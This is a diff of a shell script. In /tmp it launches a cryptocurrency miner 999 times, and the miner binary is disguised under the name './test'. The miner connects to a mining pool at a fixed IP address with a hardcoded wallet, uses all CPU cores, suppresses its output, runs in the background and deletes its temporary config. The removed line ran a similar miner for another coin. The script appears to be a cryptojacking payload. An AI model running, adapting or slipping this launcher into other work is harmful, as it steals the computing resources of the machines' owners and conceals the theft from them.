@@ -1,4 +1,11 @@
+cd /tmp
 for i in {1..999}; do
-  ./testy -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -r 143.198.26.125:3330
+  oke=app$(shuf -i 1000-9999 -n 1)
+  cp /tmp/myconfig /tmp/config.json
+  sed -i "s/KUNE/$oke/" config.json
+  #sed -i "s/ssd/$oke/" config.json
+  ./test -a rx/0 -O 143.198.26.125:3333 -u 3KG1skXBK67KZWHNvJ8aUUJH42vQVv7b9s.$oke -p $oke -t $(nproc --all) --keepalive --rig-id=$oke >/dev/null 2>&1 >/dev/null &
+  #./test --config config.json >/dev/null 2>&1 >/dev/null & sleep 0.1
   sleep 0.1
+  rm -rf config.json
 done
